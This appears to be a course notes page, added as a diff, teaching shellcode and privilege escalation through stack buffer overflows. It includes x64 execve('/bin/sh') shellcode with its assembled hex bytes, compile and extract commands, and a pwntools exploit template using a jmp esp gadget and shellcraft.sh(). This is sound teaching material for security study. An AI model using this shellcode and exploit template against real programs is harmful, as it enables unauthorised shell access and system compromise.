@@ -1,0 +1,172 @@
+---
+layout: ../../../layouts/SemesterMarkdown.astro
+---
+
+import { Image } from "astro:assets";
+import basic_overflow from "@/images/notes/basic-overflow.png";
+import injecting_code from "@/images/notes/injecting-code.png";
+
+
+# Shellcode and privilege escalation
+
+## Introductions
+
+- introductions of two students
+
+## Key concepts
+
+### Basic buffer overflow
+
+We have previously used a buffer overflow to overwrite the return address with
+an address of our choosing. For example, this could go into the code block to
+execute some functionality that was not intended. In our toy examples this code
+would print out a congratulations message or a flag, but a more dangerous piece
+of code might grant the user administrative privileges.
+
+<Image alt="basic buffer overflow, overwriting the return address with a pointer into the code block" src={basic_overflow} />
+
+### Injecting code onto the stack
+
+A more advanced attack injects code onto the stack, then writes the return
+address to point to that code. The attack code could come before or after the
+return address. In case the return address doesn't point exactly to the start of
+the injected code, the attacker can add a NOP sled in front of the code.
+
+<Image alt="buffer overflow that injects code onto the stack" src={injecting_code} />
+
+The injected code could execute:
+
+- `cat /flag.txt` in a CTF contest
+- `/bin/sh` if wanting to create a shell (which then lets the attacker execute
+  any other command)
+
+### The execve() system call
+
+The `execve` system call allows a program to transform itself into a new process
+-- "stop running my program, and run this other program instead". Never returns
+to the calling program unless an error occurred when creating the new process
+image.
+
+```c
+#include <unistd.h>
+
+int execve(const char *pathname, char *const _Nullable argv[],
+           char *const _Nullable envp[]);
+```
+
+- `pathname` is the path to a binary executable
+- `argv` is an array of arguments for the program
+- `envp` is an array of environment variables of the form `key=value`
+
+Your shell might use this to start a program when you type a command at the
+prompt:
+
+```c
+char *name[2];
+name[0] = "curl";
+name[1] = 'https://someURL.com';
+execve("/usr/bin/curl", name, NULL);
+```
+
+### Shellcode
+
+When an attacker injects code, it is really useful to have that code spawn a
+shell. They can do this using `execve` to start `/bin/sh`. To write shellcode:
+
+- write assembly to launch the shell
+- compile this into a binary
+- extract the raw bytes to use for injection
+
+Here is some
+[example shellcode](https://book.jorianwoltjer.com/binary-exploitation/shellcode)
+for the x64 architecture:
+
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+        mov rax, 59           ; choose which syscall: execve (see x64.syscall.sh)
+        lea rdi, [rip+binsh]  ; set a *pointer* to the /bin/sh string as 1st argument
+        mov rsi, 0            ; set 2nd argument (argv[]) to NULL
+        mov rdx, 0            ; set 3rd argument (envp[]) to NULL
+        syscall               ; perform the syscall we set up
+binsh:
+        .string "/bin/sh"     ; include the string we referenced
+```
+
+You can then compile this and convert it to an ascii representation:
+
+```sh
+# compile
+gcc -nostdlib -static shellcode.s -o shellcode-elf
+# convert to raw
+objcopy --dump-section .text=shellcode-raw shellcode-elf
+# hexdump to ascii
+hexdump -v -e '"\\" 1/1 "x%02x"' shellcode-raw; echo
+```
+
+This is the resulting string:
+
+```
+\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00
+```
+
+To complete the attack manually, you can use `gdb` to identify the address of
+the area where the code is located, using this to overwrite the return address.
+
+### Simplifying the attack
+
+You can use `pwntools` to greatly simplify a buffer overflow attack. A
+[video from CryptoCat](https://www.youtube.com/watch?v=4zut2Mjgh5M) walks
+through this process in detail. The script below shows the primary pieces of the
+attack.
+
+```python
+# Offset to EIP (return address)
+padding = 76
+
+# Assemble the byte sequence for 'jmp esp' so we can search for it
+# This finds a "jump esp" instruction that already exists in the binary, and points to the address of
+# that instruction. The ESP will point to the memory location right after the return address, which
+# is where you will put your payload.
+jmp_esp = asm('jmp esp')
+jmp_esp = next(elf.search(jmp_esp))
+
+# shellcode to run /bin/sh
+shellcode = asm(shellcraft.sh())
+# you could alternatively have shellcode to print the flag
+# shellcode = asm(shellcraft.cat('flag.txt'))
+
+# Build payload
+payload = flat(
+    asm('nop') * padding,
+    jmp_esp,
+    asm('nop') * 16,
+    shellcode
+)
+
+# Write payload to file to use later
+write("payload", payload)
+
+# Exploit
+io.sendlineafter(b':', payload)
+
+# Get flag/shell
+io.interactive()
+```
+
+### Privilege escalation
+
+Privilege escalation occurs any time an attacker is able to increase their
+privileges. For example:
+
+- moving from existing program functionality to running a shell
+- moving from a sandbox to the entire filesystem
+- moving from a non-root account to a root account
+- moving from user space privileges to kernel-mode privileges
+
+Our shellcode examples fall under the first category.
+
+### Additional reading
+
+- [writing Windows shellcode](https://idafchev.github.io/blog/writing_windows_shellcode/)
